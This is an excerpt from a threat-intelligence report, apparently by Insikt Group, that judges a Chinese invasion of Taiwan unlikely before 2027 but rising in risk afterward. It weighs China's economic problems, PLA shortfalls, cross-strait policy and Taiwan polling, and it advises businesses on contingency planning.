        <p>Businesses should now begin making preparatory investments to establish contingency plans in case of a Taiwan invasion, especially if they operate in Taiwan or China, rely heavily on supply chains or shipping in Asia, or are located in countries likely to oppose China’s geopolitical objectives. While an invasion in the short term (2025–2026) is currently unlikely, the factors informing Insikt Group’s assessment are rapidly evolving. Beginning in 2027 and continuing through the long term (2027–2049), the risk of an invasion will very likely continue to increase, though it is not inevitable that an invasion will occur. In the short term, China is almost certain to continue its current coercive efforts, including major military exercises and incursions into maritime and air spaces near Taiwan, while seeking ways to incrementally escalate such coercion below the level of an invasion. In these efforts, China is likely to initiate a temporary law enforcement-led quarantine and a disruptive cyber campaign against Taiwan’s critical infrastructure​​.</p>
        <p>Our assessment is based on a range of behaviors and trends across China, Taiwan, and the United States (US), as described in the <strong>Key Findings</strong> below, and in consideration of China’s broader geopolitical context (see <strong>Appendix A</strong>). Fundamentally, in the short term, we assess that — absent a specific catalyst that leads to war (such as if Taiwan were to declare formal independence) — the Chinese Communist Party (CCP) leadership is very likely to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion of Taiwan, or other conflict with foreign powers (such as over the South China Sea). In the long term, we assess that China will likely have established a level of preparedness across the military, economic, social, and other domains by 2027 that would enable its leadership to invade Taiwan as a “war of choice” (rather than in response to a specific catalyst) while minimizing associated costs and risks.</p>
        <p>Our assessment is generally aligned with public statements by Taiwan and US government and military officials since the start of 2023, both of which emphasize active preparations regardless of speculation about specific timelines. More specifically, Taiwan officials express that an invasion is currently unlikely despite the potential for a diversionary war to distract from China’s domestic economic challenges. They also highlight weaknesses in the People’s Liberation Army’s (PLA’s) amphibious capability while recognizing the PLA could likely execute a blockade of Taiwan — the foremost alternative to an invasion. US officials express that an invasion is not imminent or inevitable, but that the risk is increasing and that China’s forces are on track to meet their modernization and readiness goals.</p>
        <p>An invasion would almost certainly severely impact the global economy, disrupting critical shipping lanes, devastating the semiconductor industry, and imposing broad costs on Taiwan, China, and potentially the US. Businesses likely to be affected by a Taiwan invasion scenario should consider taking steps such as building relationships with potential alternative suppliers outside of Asia, evaluating the purchase of war risk insurance, conducting scenario-based stress tests to identify vulnerabilities in operations and investments, maintaining encrypted offline backups of key computer systems and data, isolating high-value computer systems to limit an adversary’s lateral movement in case of a breach, and purchasing a geopolitical threat intelligence capability to support ongoing monitoring of the Taiwan issue (additional recommendations can be found in the <strong>Preparing for Potential Global Economic Disruption</strong> section of this report). Indicators of escalation to support monitoring are provided in <strong>Appendix B</strong>. Given the public focus on the impact of an invasion on Taiwan’s semiconductor industry, <strong>Appendix C</strong> further offers our assessment of why that industry is not especially relevant to judging if or when China might invade.</p>
        <h2>Key Findings</h2>
        <p>Assessments supporting our judgment that an invasion is unlikely in the short term include:</p>
        <p>China almost certainly continues to prefer “peaceful reunification” and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements. China’s economy is facing challenges that are very likely holding the focus of leadership as they strive to attain national rejuvenation. Despite PLA progress in developing capabilities necessary for a successful invasion of Taiwan, China’s military continues to have limitations in areas that suggest it is not yet ready to undertake an invasion. China’s leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. Although long-term public opinion trends in Taiwan are unfavorable to China’s goals, polling results since 2020 likely suggest to China’s leadership that its strategy is working to curb preferences for independence in the short term.</p>
        <p>Assessments supporting our judgment of rising risk in the long term include:</p>
        <p>The CCP has become increasingly assertive and very likely expectant of progress with regard to its goals for Taiwan. Under Xi Jinping’s leadership, the CCP has taken administrative and other measures to develop a self-sufficient economy, harden against foreign economic coercion such as sanctions, decrease reliance on the US dollar, and prepare for shortages in strategic resources like grain and critical minerals. China-based cyber threat actors are targeting US critical infrastructure in ways that suggest their goal is to pre-position for a potential conflict. China’s leadership has intensified its use of “lawfare” measures against Taiwan, particularly over the past year. The PLA, China’s wider armed forces, and China’s defense industry are continuing to improve capabilities that would be needed for a successful invasion of Taiwan, countering US intervention, and other scenarios. The political and social environments in Taiwan are both trending toward potentially permanent rejection of unification. China’s leadership almost certainly perceives US government behavior as trending toward overturning its (the US’s) “one-China” policy, which is one of Beijing’s likely “red lines” that could hasten an invasion scenario.</p>
        <h2>Indicators an Invasion Is Unlikely in the Short Term</h2>
        <p>There are several elements of China’s behavior that support our assessment that a Taiwan invasion is unlikely before 2027. These include China’s almost certain continuing preference for “peaceful reunification”, indicators that it very likely continues to pursue a dual-track approach to Taiwan, economic challenges that very likely take priority given China’s other ambitions, shortfalls in PLA capability, and limited indication that China has begun mobilizing its populace to brace for wartime hardship. Additionally, public opinion polling results in Taiwan since 2020 likely suggest to China’s leadership that its coercive strategy is working to deter independence in the short term. In totality, we assess that — absent a specific catalyst that leads to war (such as if Taiwan declares formal independence or China assesses foreign military interference in Taiwan) — the CCP leadership is very likely, in the short term, to remain focused on improving domestic conditions and strengthening preparations for navigating tensions with the US, a potential invasion, or other conflict with a foreign power (for example, over the South China Sea).</p>
        <h3>Trends in China</h3>
        <p>China almost certainly continues to prefer “peaceful reunification” and very likely continues to invest in a dual-track strategy that combines economic inducements with coercive elements. While the coercive elements of the CCP’s strategy — including large-scale military <a href="https://jamestown.org/program/joint-sword-2024b-quarantining-key-ports-and-seizing-comprehensive-superiority/">exercises</a> (reportedly with <a href="https://web.archive.org/web/20250115022309/https://www.nsb.gov.tw/en/assets/documents/%E6%96%B0%E8%81%9E%E7%A8%BF/7d118bec-6a18-4e95-ad85-4055fc48cc31.pdf">cyber</a> components), air defense identification zone (ADIZ) <a href="https://www.platracker.com/trackers">incursions</a>, and expanding law enforcement <a href="https://amti.csis.org/a-new-normal-for-the-china-coast-guard-at-kinmen-and-matsu/">patrols</a> around Taiwan’s outlying islands — receive the most attention, examples of the other side of CCP strategy include the following: a June 2024 <a href="https://web.archive.org/web/20240723172644/https://www.cnbayarea.org.cn/policy/policy%20release/policies/content/post_1250199.html">plan</a> to “deepen cross-strait innovation and development cooperation” in Dongguan city, January 2024 reforms in Fujian that <a href="https://archive.ph/LWG6O">created</a> new government offices for Taiwan work, and a September 2023 <a href="https://web.archive.org/web/20240815054655/http://english.www.gov.cn/policies/latestreleases/202309/12/content_WS65004bc9c6d0868f4e8df605.html">plan</a> to build a “cross-strait integrated development demonstration zone” in Fujian province, and 68 other preferential policies and measures <a href="https://www.prcleader.org/post/enabling-patriots-to-be-masters-of-the-island-evolution-of-xi-s-policy-on-taiwan-since-2013">targeting</a> Taiwan businesses in China between 2018 and 2020. Xi Jinping’s activities in October 2024 also very likely signal this dual-track approach, <a href="https://web.archive.org/web/20241002182322/http://paper.people.com.cn/rmrb/html/2024-10/01/nw.D110000renmrb_20241001_1-02.htm">omitting</a> references to “peace” in statements relevant to Taiwan and <a href="https://web.archive.org/web/20250114205257/https://www.gov.cn/yaowen/liebiao/202410/content_6980772.htm">visiting</a> locations significant to China’s civil war history while also calling for greater integrated development. On January 15, 2025, a spokesperson for the Taiwan Affairs Office <a href="https://web.archive.org/web/20250116143803/http://www.news.cn/20250115/a8bedeb7d74b45ba8052a10586860648/c.html">reiterated</a> that integrated development is a focal point for the coming year. Additionally, there is almost certainly still no strict deadline for <a href="https://interpret.csis.org/what-is-beijings-timeline-for-reunification-with-taiwan/">achieving</a> unification.</p>
        <p>China’s economy is in a period of transition, volatility, and struggle, facing challenges that are very likely holding the focus of leadership as it strives to attain national rejuvenation and continue preparing for potential armed conflict. China’s challenges include a <a href="https://www.cnbc.com/2024/10/30/chinas-property-market-is-expected-to-stabilize-in-2025-.html#:~:text=China%20Economy-,China's%20property%20market%20is%20expected%20to%20stabilize%20in,but%20stay%20subdued%20for%20years&amp;text=China's%20struggling%20real%20estate%20sector,latest%20stimulus%20measures%2C%20analysts%20predict.">depressed</a> property market, <a href="https://www.fitchratings.com/research/sovereigns/deflation-in-china-risks-becoming-entrenched-05-11-2024">deflation</a>, <a href="https://www.rfa.org/english/china/2024/11/18/china-local-government-hidden-debt-explained/#:~:text=The%20International%20Monetary%20Fund%20estimates,%25%20of%20GDP%2C%20Reuters%20reported.">high</a> local government debt, <a href="https://www.voanews.com/a/foreign-investment-in-china-falls-for-past-year-as-economy-struggles/7682513.html">declining</a> foreign investment, <a href="https://www.nbcnews.com/news/world/chinas-youth-unemployment-hits-fresh-high-economic-slowdown-restrictiv-rcna172183">elevated</a> youth unemployment, and <a href="https://www.cnbc.com/2024/09/27/chinas-ambitions-for-chip-self-sufficiency-thwarted-by-lack-of-tools-.html">lingering dependence</a> on critical foreign technology like semiconductor production tools (for more on the relevance of semiconductors in China’s likely Taiwan invasion calculus, see <strong>Appendix C</strong>), while <a href="https://www.interest.co.nz/public-policy/129617/yuen-yuen-ang-explains-chinas-seemingly-contradictory-trajectory-characterised">shifting</a> toward “a green, high-tech” structure. These and other challenges have led to arguments that China could invade Taiwan to distract from domestic troubles (<a href="https://asia.nikkei.com/Politics/International-relations/Taiwan-tensions/China-could-threaten-war-in-2023-to-force-talks-Taiwan-official">1</a>, <a href="https://news.sky.com/story/china-more-likely-to-invade-taiwan-and-attack-could-come-in-2027-islands-foreign-minister-joseph-wu-warns-12789179">2</a>, <a href="https://www.theguardian.com/us-news/2023/aug/11/joe-biden-china-economy-time-bomb">3</a>, <a href="https://www.wilsoncenter.org/publication/desperate-times-desperate-measures-slowing-growth-making-china-more-dangerous">4</a>), but this is unlikely. First, diversionary war has not been the CCP’s method for <a href="https://www.foreignaffairs.com/china/myth-chinese-diversionary-war">managing</a> domestic crises since 1949. Second, the economic challenges are likely not great enough to <a href="https://www.prcleader.org/post/getting-to-world-class-can-china-s-military-persevere">derail</a> the PLA’s ongoing modernization in ways that would limit China’s option to use force in the future. During this period, Xi Jinping is very likely to focus on solving domestic economic problems while strengthening the military to support conditions for achieving national rejuvenation by 2049 — a goal with an <a href="https://www.strategictranslation.org/glossary/great-rejuvenation-of-the-chinese-nation">economic component</a> — and to prepare for unifying with Taiwan through force if doing so is deemed necessary.</p>
        <p>Despite PLA progress toward developing capabilities necessary for a successful invasion of Taiwan (discussed further below), China’s military continues to have limitations in areas that suggest it is not yet ready to undertake such a high-risk operation. These limitations very likely include a lack of sealift capacity for an invasion of Taiwan, inadequate rapid runway repair capabilities to <a href="https://www.airuniversity.af.edu/CASI/Display/Article/3430623/the-regenerating-road-chinas-rapid-runway-repair-capabilities-and-other-recover/">restore</a> air operations following enemy assaults, difficulty <a href="https://digital-commons.usnwc.edu/cmsi-maritime-reports/34/">integrating</a> submarine forces into joint operations, and helicopter forces that have readiness and operational capacity limitations. Corruption also <a href="https://media.defense.gov/2024/Dec/18/2003615520/-1/-1/0/MILITARY-AND-SECURITY-DEVELOPMENTS-INVOLVING-THE-PEOPLES-REPUBLIC-OF-CHINA-2024.PDF">continues</a> to be a <a href="https://thediplomat.com/2024/12/can-china-ever-weed-out-corruption-in-its-military/">major challenge</a> for the PLA and China’s <a href="https://thediplomat.com/2024/09/the-logic-of-chinas-careful-defense-industry-purge/">defense industry</a>, potentially disrupting the military’s organizational command, the quality of its personnel, its preparedness for warfare, and the attainment of its modernization goals.</p>
        <p>China’s leadership has likely not begun telling the public to prepare for war and public support for a war is likely not at levels the CCP would prefer before ordering an invasion. This point is debated, with some analysts focusing on Xi Jinping’s <a href="https://www.hoover.org/sites/default/files/research/docs/4_BoilingMoat_Ch1.pdf">warning</a> that “the stormy seas of a major test” are looming, his <a href="https://web.archive.org/web/20230531131348/http://politics.people.com.cn/n1/2023/0530/c1024-40002443.html">emphasis</a> on “worst-case scenario thinking”, and the CCP’s escalating rhetoric targeting Taiwan. However, when asked about this language during a US Congressional hearing in 2024, multiple experts from the US, India, and elsewhere <a href="https://www.uscc.gov/sites/default/files/2024-06/June_13_2024_Hearing_Transcript.pdf">assessed</a> that available evidence likely does not point to warnings of an imminent invasion specifically, but rather to the rising risks of China’s volatile economic and geopolitical context generally (see <strong>Appendix A</strong>). In particular, these experts <a href="https://www.uscc.gov/sites/default/files/2024-06/June_13_2024_Hearing_Transcript.pdf">focus</a> on the lack of state content “demonizing” China’s would-be opponents in Taiwan and likely the US. Moreover, only about 50% — at most — of the Chinese public likely supports a use of force to unify Taiwan under certain conditions; China’s leadership would likely prefer a stronger base of popular support before initiating a high-risk and potentially costly invasion, for reasons related to PLA <a href="https://www.uscc.gov/sites/default/files/2024-06/Devin_Thorne_Testimony.pdf">reliance</a> on civilian systems and because failure could threaten at least the current CCP leadership if not wider party legitimacy (<a href="https://digitalcommons.ndu.edu/cgi/viewcontent.cgi?article=1118&amp;context=strategic-forums">1</a>, <a href="https://www.airuniversity.af.edu/JIPA/Display/Article/2444775/the-day-after-the-battle/">2</a>, <a href="https://www.usip.org/publications/2024/11/many-ways-fail-costs-china-unsuccessful-taiwan-invasion">3</a>).</p>
        <h3>Trends in Taiwan and the US</h3>
        <p>Although long-term public opinion trends in Taiwan <a href="https://esc.nccu.edu.tw/PageDoc/Detail?fid=7801&amp;id=6963">indicate</a> the majority of people are very unlikely to ever willingly support unification (discussed later in this report), polling results since 2020 likely suggest to China’s leadership that the military and other elements of its strategy are working to curb preferences for independence in the short term. Since 2020, support for maintaining the “status quo” has increased while moving “toward independence” has trended downward (an uptick in June 2024 notwithstanding). Further, support for maintaining the “status quo indefinitely” has risen since 2020 from 25.8% to 33.6%. Support for "independence as soon as possible” has also fallen from 6.6% to 3.8% in this same period. These results likely decrease the likelihood of an invasion given China’s very likely preference for solving domestic challenges and further preparing in case an invasion is deemed necessary.</p>
        <p>Insikt Group has not identified any trends in the US that would, in our assessment, decrease the likelihood of invasion in the short term.</p>
